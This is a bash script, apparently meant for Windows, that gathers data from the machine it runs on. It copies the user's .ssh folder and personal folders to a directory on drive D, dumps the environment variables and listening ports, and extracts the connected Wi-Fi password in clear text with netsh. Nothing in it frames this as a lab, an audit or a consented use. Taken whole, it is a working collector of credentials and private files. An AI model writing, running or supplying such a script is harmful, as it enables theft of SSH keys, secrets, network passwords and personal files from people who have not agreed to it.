# Get helper file
source ./lib/helper.sh

# Paths and other vars
DRIVE_LETTER="D"
R_HOMEDIR="$DRIVE_LETTER:\\spider\\home_dir" && mkdir $R_HOMEDIR
SYSTEMINF="$DRIVE_LETTER:\\spider\\system_info" && mkdir $SYSTEMINF
dirs_in_userdir=(".ssh" "Downloads" "Pictures" "Desktop")
LB=$'\n'

# DIRs that can be interesting in $USERDIR
get_basic_files(){
  echo "Getting files from ~"
  for dir in "${dirs_in_userdir[@]}"; do
    if [ -d "$HOME/$dir" ]; then
      echo "$dir"
      find "$HOME/$dir" -type d -size -250M -exec cp -r $HOME/$dir $R_HOMEDIR \;
    else 
     echo "$dir doesn't exist"
    fi
  done
}

# Get Wi-Fi password
wifi_pass(){
  echo "Getting Wi-Fi password... ${LB}"
  ssid=$(split_string "`netsh wlan show interface | grep "SSID" | head -1`" ":")
  key=$(split_string `netsh wlan show profiles name="$ssid" key=clear | grep "Key Content"` ":")
  echo "$ssid : $key" > $SYSTEMINF\\.wifi_pass;
}

# Main
main(){
  cat << "EOF"
||   ||
 \\()//
//(__)\\
||    ||
EOF
  echo "Crawling begun...${LB}";
  echo "Taking environment variables ${LB}"
  printenv > "$SYSTEMINF"\\.env
  echo "Listening ports ${LB}"
  netstat -aon | grep "LISTENING" > "$SYSTEMINF"\\.netstat_listen
  wifi_pass
  get_basic_files
}
main